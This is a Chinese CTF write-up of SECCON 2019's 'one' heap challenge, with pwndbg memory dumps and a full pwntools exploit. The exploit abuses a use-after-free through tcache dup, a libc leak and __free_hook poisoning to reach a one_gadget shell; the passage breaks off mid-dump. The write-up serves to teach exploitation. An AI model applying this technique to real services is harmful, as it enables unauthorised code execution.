@@ -1,0 +1,2277 @@
+> **<font style="color:#F5222D;">文章中极少部分内存可能存在不准确的情况，请以实际环境为准。</font>**
+>
+> 参考资料：
+>
+> [https://faraz.faith/2019-10-20-secconctf-2019-one/](https://faraz.faith/2019-10-20-secconctf-2019-one/)
+>
+> [https://github.com/SECCON/SECCON2019_online_CTF](https://github.com/SECCON/SECCON2019_online_CTF)
+>
+> 题目来源：SECCON 2019 Online CTF: one (pwn, heap, glibc-2.27)
+>
+> 附件下载：
+>
+> 链接: [https://pan.baidu.com/s/1nDee9BZ1RMhl3bfjHPSjsA](https://pan.baidu.com/s/1nDee9BZ1RMhl3bfjHPSjsA)  密码: 8qjs
+>
+> --来自百度网盘超级会员V3的分享
+>
+
+# Linux环境
+在讲解题目之前，看一下我本机的Linux环境：
+
+![](https://cdn.nlark.com/yuque/0/2020/png/574026/1606726560792-c53c53a9-416e-4bfd-9cb4-e9015b2af903.png)
+
+Ubuntu 18.04.5、libc-2.27.so
+
+![](https://cdn.nlark.com/yuque/0/2020/png/574026/1606726640049-99f1a434-836b-468c-8144-88b0cc882d67.png)
+
+libc校验值如上图所示
+
+> 此工具的下载链接见之前的文章
+>
+
+# IDA静态分析
+## memu函数
+menu函数的功能很简单，就是在终端显示出程序的功能信息，如下图所示：
+
+![](https://cdn.nlark.com/yuque/0/2020/png/574026/1606727225098-bfeff82d-b1fa-4dc4-9f3c-73ffc6bd74d8.png)
+
+### getint-输入函数
+值得注意的是，menu函数中调用getint函数来进行输入：
+
+![](https://cdn.nlark.com/yuque/0/2020/png/574026/1606727340529-55a4029c-c4b4-46a0-8ada-1764a36c809c.png)
+
+![](https://cdn.nlark.com/yuque/0/2020/png/574026/1606727408510-2194f58d-fc57-467d-a67c-81b02027ab54.png)
+
+函数中没有什么漏洞可以利用，pass
+
+## 1、add-添加函数
+![](https://cdn.nlark.com/yuque/0/2020/png/574026/1606727496052-4baa0fa9-fae8-4106-ae4f-f31ca0cb33ce.png)
+
+通过add函数来向程序中申请堆块，且有且只能申请一个堆块。并且malloc出chunk的大小都是固定的。
+
+## 2、show-查看函数
+调用此函数即可查看malloc出的一个堆块。
+
+![](https://cdn.nlark.com/yuque/0/2020/png/574026/1606727905563-79ea2f07-d22b-4a7a-af57-3b5481e9fdf7.png)
+
+## 3、delete-函数（UAF）
+简单分析即可发现这个函数存在UAF漏洞，如下图所示：
+
+![](https://cdn.nlark.com/yuque/0/2020/png/574026/1606727991010-5dd8380c-8218-4efb-b954-ce4d271f8245.png)
+
+## 0、exit-退出程序
+略，break之后直接return 0了
+
+# pwndbg动态调试
+## 文件保护
+![](https://cdn.nlark.com/yuque/0/2020/png/574026/1606728316116-74b0fe03-5a20-4dd9-87c9-9036708aa629.png)
+
+保护全开，但是我们使用pwndbg调试程序时不会使程序内存分布随机化。
+
+通过定位，bss段中的memo变量地址为：0x555555756050
+
+```c
+pwndbg> x/16gx &memo
+0x555555756050 <memo>:	0x0000555555757670	0x0000000000000000
+0x555555756060:	0x0000000000000000	0x0000000000000000
+0x555555756070:	0x0000000000000000	0x0000000000000000
+0x555555756080:	0x0000000000000000	0x0000000000000000
+0x555555756090:	0x0000000000000000	0x0000000000000000
+0x5555557560a0:	0x0000000000000000	0x0000000000000000
+0x5555557560b0:	0x0000000000000000	0x0000000000000000
+0x5555557560c0:	0x0000000000000000	0x0000000000000000
+pwndbg> 
+```
+
+## 第一次输入内容
+gdb运行程序，第一次输入内容：1234567890
+
+输入完成之后，来看一下内存情况：
+
+```c
+pwndbg> heap
+Allocated chunk | PREV_INUSE
+Addr: 0x555555757000
+Size: 0x251
+
+Allocated chunk | PREV_INUSE
+Addr: 0x555555757250
+Size: 0x411
+
+Allocated chunk | PREV_INUSE
+Addr: 0x555555757660
+Size: 0x51
+
+Top chunk | PREV_INUSE
+Addr: 0x5555557576b0
+Size: 0x20951
+
+pwndbg> x/250gx 0x555555757000
+0x555555757000:	0x0000000000000000	0x0000000000000251 #tcache_perthread_struct
+......(省略内容均为空)
+0x555555757250:	0x0000000000000000	0x0000000000000411 #malloc_buffer
+0x555555757260:	0x3837363534333231	0x00000000000a3039
+    			#1234567890(小端序)
+......(省略内容均为空)
+0x555555757660:	0x0000000000000000	0x0000000000000051 #chunk1
+0x555555757670:	0x3837363534333231	0x0000000000003039
+0x555555757680:	0x0000000000000000	0x0000000000000000
+0x555555757690:	0x0000000000000000	0x0000000000000000
+0x5555557576a0:	0x0000000000000000	0x0000000000000000
+0x5555557576b0:	0x0000000000000000	0x0000000000020951 #top_chunk
+......(省略内容均为空)
+0x5555557577c0:	0x0000000000000000	0x0000000000000000
+pwndbg> bin
+tcachebins
+empty
+fastbins
+0x20: 0x0
+0x30: 0x0
+0x40: 0x0
+0x50: 0x0
+0x60: 0x0
+0x70: 0x0
+0x80: 0x0
+unsortedbin
+all: 0x0
+smallbins
+empty
+largebins
+empty
+pwndbg> x/16gx &memo
+0x555555756050 <memo>:	0x0000555555757670	0x0000000000000000
+0x555555756060:	0x0000000000000000	0x0000000000000000
+0x555555756070:	0x0000000000000000	0x0000000000000000
+0x555555756080:	0x0000000000000000	0x0000000000000000
+0x555555756090:	0x0000000000000000	0x0000000000000000
+0x5555557560a0:	0x0000000000000000	0x0000000000000000
+0x5555557560b0:	0x0000000000000000	0x0000000000000000
+0x5555557560c0:	0x0000000000000000	0x0000000000000000
+pwndbg>
+```
+
+> malloc_buffer这个chunk是程序在输入时自动申请的缓冲区
+>
+
+## 第二次输入内容
+在终端中输入c以继续运行程序，我们输入“qwertyuiop”，再次查看内容的情况：
+
+```c
+pwndbg> heap
+Allocated chunk | PREV_INUSE
+Addr: 0x555555757000
+Size: 0x251
+
+Allocated chunk | PREV_INUSE
+Addr: 0x555555757250
+Size: 0x411
+
+Allocated chunk | PREV_INUSE
+Addr: 0x555555757660
+Size: 0x51
+
+Allocated chunk | PREV_INUSE
+Addr: 0x5555557576b0
+Size: 0x51
+
+Top chunk | PREV_INUSE
+Addr: 0x555555757700
+Size: 0x20901
+
+pwndbg> x/250gx 0x555555757000
+0x555555757000:	0x0000000000000000	0x0000000000000251 #tcache_perthread_struct 
+......(省略内容均为空)
+0x555555757250:	0x0000000000000000	0x0000000000000411 #malloc_buffer
+0x555555757260:	0x6975797472657771	0x00000000000a706f
+......(省略内容均为空)
+0x555555757660:	0x0000000000000000	0x0000000000000051 #chunk1
+0x555555757670:	0x3837363534333231	0x0000000000003039
+0x555555757680:	0x0000000000000000	0x0000000000000000
+0x555555757690:	0x0000000000000000	0x0000000000000000
+0x5555557576a0:	0x0000000000000000	0x0000000000000000
+0x5555557576b0:	0x0000000000000000	0x0000000000000051 #chunk2
+0x5555557576c0:	0x6975797472657771	0x000000000000706f
+0x5555557576d0:	0x0000000000000000	0x0000000000000000
+0x5555557576e0:	0x0000000000000000	0x0000000000000000
+0x5555557576f0:	0x0000000000000000	0x0000000000000000
+0x555555757700:	0x0000000000000000	0x0000000000020901 #top_chunk
+......(省略内容均为空)
+0x5555557577c0:	0x0000000000000000	0x0000000000000000
+pwndbg> bin
+tcachebins
+empty
+fastbins
+0x20: 0x0
+0x30: 0x0
+0x40: 0x0
+0x50: 0x0
+0x60: 0x0
+0x70: 0x0
+0x80: 0x0
+unsortedbin
+all: 0x0
+smallbins
+empty
+largebins
+empty
+pwndbg> x/16gx &memo
+0x555555756050 <memo>:	0x00005555557576c0	0x0000000000000000
+-----------------------------------------------------------------
+第二次输入前：
+0x555555756050 <memo>:	0x0000555555757670	0x0000000000000000
+-----------------------------------------------------------------
+0x555555756060:	0x0000000000000000	0x0000000000000000
+0x555555756070:	0x0000000000000000	0x0000000000000000
+0x555555756080:	0x0000000000000000	0x0000000000000000
+0x555555756090:	0x0000000000000000	0x0000000000000000
+0x5555557560a0:	0x0000000000000000	0x0000000000000000
+0x5555557560b0:	0x0000000000000000	0x0000000000000000
+0x5555557560c0:	0x0000000000000000	0x0000000000000000
+pwndbg> 
+```
+
+从上面可以看出，第二次malloc之后，原来的堆块并没有消失，但是第二次malloc出的chunk指针覆盖了原来指针地址并且指向了新的chunk_data。之后的free也是根据memo的内容来的。
+
+接下来我们free之前创建的第二个chunk：
+
+```c
+pwndbg> heap
+Allocated chunk | PREV_INUSE
+Addr: 0x555555757000
+Size: 0x251
+
+Allocated chunk | PREV_INUSE
+Addr: 0x555555757250
+Size: 0x411
+
+Allocated chunk | PREV_INUSE---------（chunk1）
+Addr: 0x555555757660 
+Size: 0x51
+
+Free chunk (tcache) | PREV_INUSE---------（chunk2）
+Addr: 0x5555557576b0
+Size: 0x51
+fd: 0x00
+
+Top chunk | PREV_INUSE
+Addr: 0x555555757700
+Size: 0x20901
+
+pwndbg> 
+```
+
+bin中也回收了chunk2：
+
+```c
+pwndbg> bin
+tcachebins
+0x50 [  1]: 0x5555557576c0 ◂— 0x0
+fastbins
+0x20: 0x0
+0x30: 0x0
+0x40: 0x0
+0x50: 0x0
+0x60: 0x0
+0x70: 0x0
+0x80: 0x0
+unsortedbin
+all: 0x0
+smallbins
+empty
+largebins
+empty
+pwndbg> 
+```
+
+最重要的是看一下memo指针：
+
+```c
+pwndbg> x/16gx &memo
+0x555555756050 <memo>:	0x00005555557576c0	0x0000000000000000
+0x555555756060:	0x0000000000000000	0x0000000000000000
+0x555555756070:	0x0000000000000000	0x0000000000000000
+0x555555756080:	0x0000000000000000	0x0000000000000000
+0x555555756090:	0x0000000000000000	0x0000000000000000
+0x5555557560a0:	0x0000000000000000	0x0000000000000000
+0x5555557560b0:	0x0000000000000000	0x0000000000000000
+0x5555557560c0:	0x0000000000000000	0x0000000000000000
+pwndbg> 
+```
+
+由于程序有UAF漏洞的存在，memo指针地址并没有清空。
+
+# exp及Debug_content
+## exp
+首先来看一下exp吧，这个exp只是相对参考文章将system("/bin/sh")更改为one_gadget。
+
+```python
+#!/usr/bin/env python2
+
+from pwn import *
+context.log_level = 'debug'
+BINARY = './one'
+HOST, PORT = 'one.chal.seccon.jp', 18357
+
+elf = ELF(BINARY)
+libc = ELF('./libc-2.27.so')
+
+def start():
+    if not args.REMOTE:
+        print "LOCAL PROCESS"
+        return process(BINARY)
+    else:
+        print "REMOTE PROCESS"
+        return remote(HOST, PORT)
+
+def get_base_address(proc):
+    return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)
+
+def debug(breakpoints):
+    script = "handle SIGALRM ignore\n"
+    PIE = get_base_address(p)
+    script += "set $_base = 0x{:x}\n".format(PIE)
+    for bp in breakpoints:
+        script += "b *0x%x\n"%(PIE+bp)
+    gdb.attach(p,gdbscript=script)
+
+def add(content):
+    p.sendlineafter('> ', '1')
+    p.sendlineafter('> ', content)
+
+def show():
+    p.sendlineafter('> ', '2')
+
+def free():
+    p.sendlineafter('> ', '3')
+
+context.terminal = ['tmux', 'new-window']
+
+p = start()
+if args.GDB:
+    debug([])
+
+# ----------- Heap Leak ------------
+# Prepare
+add('A'*0x3e)
+
+# We do four frees to set the 0x40 tcache bin count to 4
+for i in range(4):
+    free()
+
+# Leak the fourth chunk's address on the heap
+show()
+
+heap_leak = u64(p.recvline().strip('\n').ljust(8, '\x00'))
+log.info('Heap leak: ' + hex(heap_leak))
+
+# ----------- Libc Leak ------------
+# Empty the 0x40 tcache bin first
+add(p64(0) + 'A'*8) # Set FD to null here
+add('A'*8) # 0x40 tcache bin now empty
+# Note that after the above, the 0x40 tcache bin will have count = 2
+
+# Create four chunks to prep for libc leak
+# Make all of them have fake chunks in them with PREV_INUSE bits set
+# And make all of them have valid FD pointers as well
+for i in range(4):
+    add((p64(heap_leak) + p64(0x91)) * 3)
+
+# Double free the last chunk
+free() # count = 3
+free() # count = 4
+
+# Set FD to one of the fake 0x91 chunks
+add(p64(heap_leak + 0x60)) # count = 3
+add('A'*8) # count = 2
+add('A'*8) # Got a 0x91 chunk, count = 1
+
+# Free 7 times to fill up tcache bin, 8th one goes into unsorted bin
+for i in range(8):
+    free()
+
+# Unsorted bin libc leak
+show()
+leak = u64(p.recvline().strip('\n').ljust(8, '\x00'))
+libc.address = leak - 0x3ebca0 # Offset found using gdb
+free_hook = libc.symbols['__free_hook']
+system = libc.symbols['system']
+
+log.info('Libc leak: ' + hex(leak))
+log.info('Libc base: ' + hex(libc.address))
+log.info('__free_hook: ' + hex(free_hook))
+log.info('system: ' + hex(system))
+
+# Tcache poisoning attack to overwrite __free_hook with system
+add('A'*8) # count = 0
+free()
+free()
+
+# Overwrite __free_hook with system
+add(p64(free_hook))
+add(p64(0))
+#add(p64(system))
+one_gadget=[0x4f365,0x4f3c2,0x10a45c]
+payload=one_gadget[1]+libc.address
+add(p64(payload))
+
+# Call system("/bin/sh\x00")
+#add('/bin/sh\x00')
+free()
+
+p.interactive()
+```
+
+看一下本机的one_gadget：
+
+![](https://cdn.nlark.com/yuque/0/2020/png/574026/1606736682024-d85e0916-ff36-4cc6-ab0c-f1b6e3ccfe56.png)
+
+有三个execve("/bin/sh")；地址分别为：0x4f365,0x4f3c2,0x10a45c
+
+## attack大致思路
+题目attack步骤如下：
+
+1. 利用Tcache dup泄漏堆地址。
+2. 使用泄漏的堆地址和tcache poisoning 在内存中伪造大小为0x91的chunk。
+3. free此0x91大小的块7次来填充满0x90 tcache bin。再释放一次就会将free chunk放入到unsortedbin中以泄露libc。
+4. 利用tcache poisoning攻击覆盖`__free_hook`到`one_gadget`。
+5. 释放chunk，用于调用`execve('/bin/sh')`并getshell。
+
+## 模仿程序的功能
+> 文章此处之后出现的地址均为exp附加gdb调试的地址（地址随机）
+>
+
+写exp肯定要先写出程序对应的输入输出功能，从而自动化劫持程序的流程到shell：
+
+```python
+#!/usr/bin/env python2
+
+from pwn import *
+context.log_level = 'debug'
+BINARY = './one'
+HOST, PORT = 'one.chal.seccon.jp', 18357
+
+elf = ELF(BINARY)
+libc = ELF('./libc-2.27.so')
+
+def start():
+    if not args.REMOTE:
+        print "LOCAL PROCESS"
+        return process(BINARY)
+    else:
+        print "REMOTE PROCESS"
+        return remote(HOST, PORT)
+
+def get_base_address(proc):
+    return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)
+
+def debug(breakpoints):
+    script = "handle SIGALRM ignore\n"
+    PIE = get_base_address(p)
+    script += "set $_base = 0x{:x}\n".format(PIE)
+    for bp in breakpoints:
+        script += "b *0x%x\n"%(PIE+bp)
+    gdb.attach(p,gdbscript=script)
+
+def add(content):
+    p.sendlineafter('> ', '1')
+    p.sendlineafter('> ', content)
+
+def show():
+    p.sendlineafter('> ', '2')
+
+def free():
+    p.sendlineafter('> ', '3')
+
+context.terminal = ['tmux', 'new-window']
+
+p = start()
+if args.GDB:
+    debug([])
+```
+
+## 泄露堆地址
+由于这个程序开启了PIE保护，这样程序每次运行的地址都是随机的。要泄露libc的基地址就要先泄露出堆的地址。由于程序存在UAF漏洞，因此可以对同一个chunk多次进行free。
+
+部分payload代码如下所示：
+
+```python
+# ----------- Heap Leak ------------
+# Prepare
+add('A'*0x3e)
+# We do four frees to set the 0x50 tcache bin count to 4
+for i in range(4):
+    free()
+# Leak the fourth chunk's address on the heap
+show()
+heap_leak = u64(p.recvline().strip('\n').ljust(8, '\x00'))
+log.info('Heap leak: ' + hex(heap_leak))
+```
+
+### 申请chunk1，memo='A'*0x3e
+首先先申请chunk的内容为0x3e个'A'，申请之后内存状况如下：
+
+```python
+pwndbg> heap
+Allocated chunk | PREV_INUSE
+Addr: 0x56064e117000
+Size: 0x251
+
+Allocated chunk | PREV_INUSE
+Addr: 0x56064e117250
+Size: 0x1011
+
+Allocated chunk | PREV_INUSE
+Addr: 0x56064e118260
+Size: 0x51
+
+Top chunk | PREV_INUSE
+Addr: 0x56064e1182b0
+Size: 0x1fd51
+
+pwndbg> x/800gx 0x56064e117000
+0x56064e117000:	0x0000000000000000	0x0000000000000251 #tcache_perthread_struct
+......(省略内容均为空)
+0x56064e117250:	0x0000000000000000	0x0000000000001011 #malloc_buffer
+0x56064e117260:	0x4141414141414141	0x4141414141414141
+0x56064e117270:	0x4141414141414141	0x4141414141414141
+0x56064e117280:	0x4141414141414141	0x4141414141414141
+0x56064e117290:	0x4141414141414141	0x000a414141414141
+......(省略内容均为空)
+0x56064e118260:	0x0000000000000000	0x0000000000000051 #chunk1
+0x56064e118270:	0x4141414141414141	0x4141414141414141
+0x56064e118280:	0x4141414141414141	0x4141414141414141
+0x56064e118290:	0x4141414141414141	0x4141414141414141
+0x56064e1182a0:	0x4141414141414141	0x0000414141414141
+0x56064e1182b0:	0x0000000000000000	0x000000000001fd51 #top_chunk
+......(省略内容均为空)
+0x56064e1188f0:	0x0000000000000000	0x0000000000000000
+pwndbg> 
+```
+
+### 利用tcache_dup漏洞4次free（chunk1）
+然后对chunk1进行多次free：
+
+```python
+pwndbg> heap
+Allocated chunk | PREV_INUSE
+Addr: 0x56064e117000
+Size: 0x251
+
+Allocated chunk | PREV_INUSE
+Addr: 0x56064e117250
+Size: 0x1011
+
+Free chunk (tcache) | PREV_INUSE
+Addr: 0x56064e118260
+Size: 0x51
+fd: 0x56064e118270
+
+Top chunk | PREV_INUSE
+Addr: 0x56064e1182b0
+Size: 0x1fd51
+
+pwndbg> bin
+tcachebins
+0x50 [  4]: 0x56064e118270 ◂— 0x56064e118270
+fastbins
+0x20: 0x0
+0x30: 0x0
+0x40: 0x0
+0x50: 0x0
+0x60: 0x0
+0x70: 0x0
+0x80: 0x0
+unsortedbin
+all: 0x0
+smallbins
+empty
+largebins
+empty
+pwndbg> 
+```
+
+再来看一下内存：
+
+```python
+pwndbg> x/800gx 0x56064e117000
+0x56064e117000:	0x0000000000000000	0x0000000000000251 #tcache_perthread_struct
+0x56064e117010:	0x0000000004000000	0x0000000000000000
+    			#4个tcache_bin_chunk
+0x56064e117020:	0x0000000000000000	0x0000000000000000
+0x56064e117030:	0x0000000000000000	0x0000000000000000
+0x56064e117040:	0x0000000000000000	0x0000000000000000
+0x56064e117050:	0x0000000000000000	0x0000000000000000
+0x56064e117060:	0x0000000000000000	0x000056064e118270
+    								#指向chunk1_data	
+......（省略内容均为空）
+0x56064e117250:	0x0000000000000000	0x0000000000001011 #malloc_buffer
+0x56064e117260:	0x4141414141410a33	0x4141414141414141
+0x56064e117270:	0x4141414141414141	0x4141414141414141
+0x56064e117280:	0x4141414141414141	0x4141414141414141
+0x56064e117290:	0x4141414141414141	0x000a414141414141
+......（省略内容均为空）
+0x56064e118260:	0x0000000000000000	0x0000000000000051 #chunk1
+0x56064e118270:	0x000056064e118270	0x4141414141414141
+    			#指向chunk1_data（自身）
+0x56064e118280:	0x4141414141414141	0x4141414141414141
+0x56064e118290:	0x4141414141414141	0x4141414141414141
+0x56064e1182a0:	0x4141414141414141	0x0000414141414141
+0x56064e1182b0:	0x0000000000000000	0x000000000001fd51 #top_chunk
+......（省略内容均为空）
+0x56064e1188f0:	0x0000000000000000	0x0000000000000000
+pwndbg>
+```
+
+首先，heap_leak很容易。添加一个chunk并释放四次，再打印其memo就可以得到heap的地址。
+
+从上面可以看到free同一堆块四次后打乱了0x50 tcache bin保存的chunk数目（实际bin中只有两条链，虽然都是同一个链）。但是不要担心，之后的步骤会修复此数目。
+
+### 打印chunk1的memo
+当我们打印chunk1的内容时，前8个字节就是chunk1的地址。这样我们离泄露libc基地址又近了一步。
+
+> heap_leak=0x000056064e118270
+>
+
+## 泄露libc基地址
+经过上面的步骤，tcache的0x50 bin中已经存在4个free_chunk（虽然都是同一个）。
+
+```python
+# ----------- Libc Leak ------------
+# Empty the 0x50 tcache bin first
+add(p64(0) + 'A'*8) # Set FD to null here
+add('A'*8) # 0x50 tcache bin now empty
+# Note that after the above, the 0x50 tcache bin will have count = 2
+```
+
+### 在tcache中malloc出第一个free_chunk1
+```python
+add(p64(0) + 'A'*8) # Set FD to null here
+```
+
+执行此段payload之后内存状况如下：
+
+```python
+pwndbg> heap
+Allocated chunk | PREV_INUSE
+Addr: 0x55579eb7c000
+Size: 0x251
+
+Allocated chunk | PREV_INUSE
+Addr: 0x55579eb7c250
+Size: 0x1011
+
+Free chunk (tcache) | PREV_INUSE
+Addr: 0x55579eb7d260
+Size: 0x51
+fd: 0x00
+
+Top chunk | PREV_INUSE
+Addr: 0x55579eb7d2b0
+Size: 0x1fd51
+
+pwndbg> x/800gx 0x56064e117000
+0x56064e117000:	0x0000000000000000	0x0000000000000251 #tcache_perthread_struct
+0x56064e117010:	0x0000000003000000	0x0000000000000000
+ 				#count=3
+......(省略内容均为空)
+0x56064e17c060:	0x0000000000000000	0x000056064e118270
+......(省略内容均为空)
+0x56064e117250:	0x0000000000000000	0x0000000000001011 #malloc_buffer
+0x56064e117260:	0x0000000000000000	0x4141414141414141
+0x56064e117270:	0x414141414141410a	0x4141414141414141
+0x56064e117280:	0x4141414141414141	0x4141414141414141
+0x56064e117290:	0x4141414141414141	0x000a414141414141
+......(省略内容均为空)
+0x56064e118260:	0x0000000000000000	0x0000000000000051 #chunk1
+0x56064e118270:	0x0000000000000000	0x4141414141414141 #这里的内容发生了修改
+    			#chunk1_next指针已经清空
+0x56064e118280:	0x414141414141000a	0x4141414141414141
+0x56064e118290:	0x4141414141414141	0x4141414141414141
+0x56064e1182a0:	0x4141414141414141	0x0000414141414141
+0x56064e1182b0:	0x0000000000000000	0x000000000001fd51 #top_chunk
+......(省略内容均为空)
+0x56064e1188f0:	0x0000000000000000	0x0000000000000000
+pwndbg> bin
+tcachebins
+0x50 [  3]: 0x56064e118270 ◂— 0x0
+fastbins
+0x20: 0x0
+0x30: 0x0
+0x40: 0x0
+0x50: 0x0
+0x60: 0x0
+0x70: 0x0
+0x80: 0x0
+unsortedbin
+all: 0x0
+smallbins
+empty
+largebins
+empty
+pwndbg> 
+```
+
+和之前的内存状况相比较，由于tcache中存在相当于4个free_chunk1，因此在申请的时候优先使用这4个free_chunk1。所以add(p64(0) + 'A'*8)时候修改的是chunk1的memo。
+
+这一小段payload的目的是为了清空free_chunk1的next指针。
+
+> tcache的0x50 bin中现在存在3个free_chunk1
+>
+
+### 在tcache中malloc出第二个free_chunk1
+> 重新malloc同一chunk之后，原有的memo并不会消失，而是写入时直接覆盖原有memo
+>
+
+```python
+add('A'*8) # 0x50 tcache bin now empty
+```
+
+执行之后，内存状况如下：
+
+```python
+pwndbg> x/800gx 0x56064e117000
+0x56064e117000:	0x0000000000000000	0x0000000000000251 #tcache_perthread_struct
+0x56064e117010:	0x0000000002000000	0x0000000000000000
+    			#count=2
+......（省略内容均为空）
+0x56064e117250:	0x0000000000000000	0x0000000000001011 #malloc_buffer
+0x56064e117260:	0x4141414141414141	0x414141414141410a
+0x56064e117270:	0x414141414141410a	0x4141414141414141
+0x56064e117280:	0x4141414141414141	0x4141414141414141
+0x56064e117290:	0x4141414141414141	0x000a414141414141
+......（省略内容均为空）
+0x56064e118260:	0x0000000000000000	0x0000000000000051 #chunk1
+0x56064e118270:	0x4141414141414141	0x4141414141410000
+0x56064e118280:	0x414141414141000a	0x4141414141414141
+0x56064e118290:	0x4141414141414141	0x4141414141414141
+0x56064e1182a0:	0x4141414141414141	0x0000414141414141
+0x56064e1182b0:	0x0000000000000000	0x000000000001fd51 #top_chunk
+......（省略内容均为空）
+0x56064e1188f0:	0x0000000000000000	0x0000000000000000
+pwndbg> bin
+tcachebins
+0x50 [  2]: 0x0
+fastbins
+0x20: 0x0
+0x30: 0x0
+0x40: 0x0
+0x50: 0x0
+0x60: 0x0
+0x70: 0x0
+0x80: 0x0
+unsortedbin
+all: 0x0
+smallbins
+empty
+largebins
+empty
+pwndbg> 
+```
+
+通过这两次的malloc，tcachebin的0x50链中剩余两个free_chunk（实际上已经没有了）。
+
+### malloc4个新堆块
+```python
+# Create four chunks to prep for libc leak
+# Make all of them have fake chunks in them with PREV_INUSE bits set
+# And make all of them have valid FD pointers as well
+for i in range(4):
+    add((p64(heap_leak) + p64(0x91)) * 3)
+```
+
+上面是创建4个chunk来为泄露libc基地址做好准备，添加堆块的内容均为heap_leak+0x91。
+
+虽然显示的是tcachebin中仍然有2个free_chunk，由于之前我们使用了tcache dup，因此此时实际上tcachebin已空。so，4个malloc是创建了4个新的堆块，malloc之后tcache_bin的数目不会变化，结果如下：
+
+```python
+pwndbg> heap
+Allocated chunk | PREV_INUSE
+Addr: 0x56064e117000
+Size: 0x251
+
+Allocated chunk | PREV_INUSE
+Addr: 0x56064e117250
+Size: 0x1011
+
+Allocated chunk | PREV_INUSE
+Addr: 0x56064e118260
+Size: 0x51
+
+Allocated chunk | PREV_INUSE
+Addr: 0x56064e1182b0
+Size: 0x51
+
+Allocated chunk | PREV_INUSE
+Addr: 0x56064e118300
+Size: 0x51
+
+Allocated chunk | PREV_INUSE
+Addr: 0x56064e118350
+Size: 0x51
+
+Allocated chunk | PREV_INUSE
+Addr: 0x56064e1183a0
+Size: 0x51
+
+Top chunk | PREV_INUSE
+Addr: 0x56064e1183f0
+Size: 0x1fc11
+
+pwndbg> x/800gx 0x56064e117000
+0x56064e117000:	0x0000000000000000	0x0000000000000251 #tcache_perthread_struct
+0x56064e117010:	0x0000000002000000	0x0000000000000000
+    			#count=2
+......（省略内容均为空）
+0x56064e117250:	0x0000000000000000	0x0000000000001011 #malloc_buffer
+0x56064e117260:	0x000056064e118270	0x0000000000000091
+0x56064e117270:	0x000056064e118270	0x0000000000000091
+0x56064e117280:	0x000056064e118270	0x0000000000000091
+0x56064e117290:	0x414141414141410a	0x000a414141414141
+......（省略内容均为空）
+0x56064e118260:	0x0000000000000000	0x0000000000000051 #chunk1
+0x56064e118270:	0x4141414141414141	0x4141414141410000
+0x56064e118280:	0x414141414141000a	0x4141414141414141
+0x56064e118290:	0x4141414141414141	0x4141414141414141
+0x56064e1182a0:	0x4141414141414141	0x0000414141414141
+0x56064e1182b0:	0x0000000000000000	0x0000000000000051 #new_malloc_chunk2
+0x56064e1182c0:	0x000056064e118270	0x0000000000000091
+0x56064e1182d0:	0x000056064e118270	0x0000000000000091
+0x56064e1182e0:	0x000056064e118270	0x0000000000000091
+0x56064e1182f0:	0x000000000000000a	0x0000000000000000
+0x56064e118300:	0x0000000000000000	0x0000000000000051 #new_malloc_chunk3
+0x56064e118310:	0x000056064e118270	0x0000000000000091
+0x56064e118320:	0x000056064e118270	0x0000000000000091
+0x56064e118330:	0x000056064e118270	0x0000000000000091
+0x56064e118340:	0x000000000000000a	0x0000000000000000
+0x56064e118350:	0x0000000000000000	0x0000000000000051 #new_malloc_chunk4
+0x56064e118360:	0x000056064e118270	0x0000000000000091
+0x56064e118370:	0x000056064e118270	0x0000000000000091
+0x56064e118380:	0x000056064e118270	0x0000000000000091
+0x56064e118390:	0x000000000000000a	0x0000000000000000
+0x56064e1183a0:	0x0000000000000000	0x0000000000000051 #new_malloc_chunk5
+0x56064e1183b0:	0x000056064e118270	0x0000000000000091
+0x56064e1183c0:	0x000056064e118270	0x0000000000000091
+0x56064e1183d0:	0x000056064e118270	0x0000000000000091
+0x56064e1183e0:	0x000000000000000a	0x0000000000000000
+0x56064e1183f0:	0x0000000000000000	0x000000000001fc11 #top_chunk
+......（省略内容均为空）
+0x56064e1188f0:	0x0000000000000000	0x0000000000000000
+pwndbg> bin
+tcachebins
+0x50 [  2]: 0x0
+fastbins
+0x20: 0x0
+0x30: 0x0
+0x40: 0x0
+0x50: 0x0
+0x60: 0x0
+0x70: 0x0
+0x80: 0x0
+unsortedbin
+all: 0x0
+smallbins
+empty
+largebins
+empty
+pwndbg> 
+```
+
+### 释放两次chunk5到tcache
+根据程序的特性，两次free指的是free两次chunk5
+
+```python
+# Double free the last chunk
+free() # count = 3
+free() # count = 4
+```
+
+内存状况如下：
+
+```python
+pwndbg> heap
+Allocated chunk | PREV_INUSE
+Addr: 0x56064e117000
+Size: 0x251
+
+Allocated chunk | PREV_INUSE
+Addr: 0x56064e117250
+Size: 0x1011
+
+Allocated chunk | PREV_INUSE
+Addr: 0x56064e118260
+Size: 0x51
+
+Allocated chunk | PREV_INUSE
+Addr: 0x56064e1182b0
+Size: 0x51
+
+Allocated chunk | PREV_INUSE
+Addr: 0x56064e118300
+Size: 0x51
+
+Allocated chunk | PREV_INUSE
+Addr: 0x56064e118350
+Size: 0x51
+
+Free chunk (tcache) | PREV_INUSE
+Addr: 0x56064e1183a0
+Size: 0x51
+fd: 0x56064e1183b0
+
+Top chunk | PREV_INUSE
+Addr: 0x56064e1183f0
+Size: 0x1fc11
+
+pwndbg> x/800gx 0x56064e117000
+0x56064e117000:	0x0000000000000000	0x0000000000000251 #tcache_perthread_struct
+0x56064e117010:	0x0000000004000000	0x0000000000000000
+    			#4个tcache
+......(省略内容均为空)
+0x56064e117060:	0x0000000000000000	0x000056064e1183b0
+    								#指向chunk5_data
+......(省略内容均为空)
+0x56064e117250:	0x0000000000000000	0x0000000000001011 #malloc_buffer
+0x56064e117260:	0x000056064e110a33	0x0000000000000091
+0x56064e117270:	0x000056064e118270	0x0000000000000091
+0x56064e117280:	0x000056064e118270	0x0000000000000091
+0x56064e117290:	0x414141414141410a	0x000a414141414141
+......(省略内容均为空)
+0x56064e118260:	0x0000000000000000	0x0000000000000051 #chunk1
+0x56064e118270:	0x4141414141414141	0x4141414141410000
+0x56064e118280:	0x414141414141000a	0x4141414141414141
+0x56064e118290:	0x4141414141414141	0x4141414141414141
+0x56064e1182a0:	0x4141414141414141	0x0000414141414141
+0x56064e1182b0:	0x0000000000000000	0x0000000000000051 #chunk2
+0x56064e1182c0:	0x000056064e118270	0x0000000000000091
+0x56064e1182d0:	0x000056064e118270	0x0000000000000091
+0x56064e1182e0:	0x000056064e118270	0x0000000000000091
+0x56064e1182f0:	0x000000000000000a	0x0000000000000000
+0x56064e118300:	0x0000000000000000	0x0000000000000051 #chunk3
